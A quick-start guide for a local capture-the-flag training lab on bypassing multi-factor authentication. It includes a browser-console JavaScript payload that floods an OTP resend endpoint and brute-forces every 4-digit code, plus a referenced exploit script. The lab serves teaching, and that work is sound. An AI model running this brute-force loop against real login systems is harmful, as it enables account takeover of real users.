# 🚀 Quick Start Guide - MFA Bypass Lab

## Installation (2 minutes)

### Option 1: Using the Archive
```bash
# Extract the lab
tar -xzf mfa-bypass-lab.tar.gz
cd mfa-bypass-lab

# Deploy the lab
./deploy.sh
```

### Option 2: Using the Directory
```bash
# Navigate to the lab
cd mfa-bypass-lab

# Deploy the lab
./deploy.sh
```

## Access the Lab

Open your browser and go to: **http://localhost:5000**

## Credentials

- **Username:** student
- **Password:** password123

## Quick Attack (30 seconds)

1. Login with the credentials above
2. Open browser Developer Tools (F12)
3. Go to Console tab
4. Paste and run this:

```javascript
// Generate 50 OTPs
for(let i=0; i<50; i++) fetch('/resend_otp',{method:'POST'});

// Brute force
(async()=>{for(let i=0;i<10000;i++){let otp=String(i).padStart(4,'0');let r=await fetch('/verify_otp',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`otp=${otp}`});let d=await r.json();if(d.success){console.log(`✅ ${otp}`);location.href=d.redirect;return}if(i%100==0)console.log(`${i}...`)}})();
```

5. Wait for success (usually 30-60 seconds)
6. Get the FLAG! 🎉

## Alternative: Use the Exploit Script

```bash
pip install requests
python3 exploit.py
```

## Stop the Lab

```bash
docker-compose down
```

## Files Structure

```
mfa-bypass-lab/
├── README.md              # Full documentation
├── STUDENT_GUIDE.md       # Detailed walkthrough
├── QUICK_START.md         # This file
├── app.py                 # Vulnerable Flask application
├── exploit.py             # Automated exploit script
├── deploy.sh              # Deployment script
├── Dockerfile             # Docker configuration
├── docker-compose.yml     # Docker Compose config
├── requirements.txt       # Python dependencies
└── templates/             # HTML templates
    ├── index.html         # Login page
    ├── mfa.html          # MFA verification page
    └── dashboard.html     # Success page with FLAG
```

## Need Help?

- Read the full **README.md** for complete documentation
- Check **STUDENT_GUIDE.md** for step-by-step instructions
- Review the code in **app.py** to understand the vulnerability

## Expected FLAG

After successful bypass, you'll see:
```
CTF{MFA_BYPASS_MITM_ATTACK_SUCCESS_2024}
```

---

**That's it! Happy hacking! 🔐**
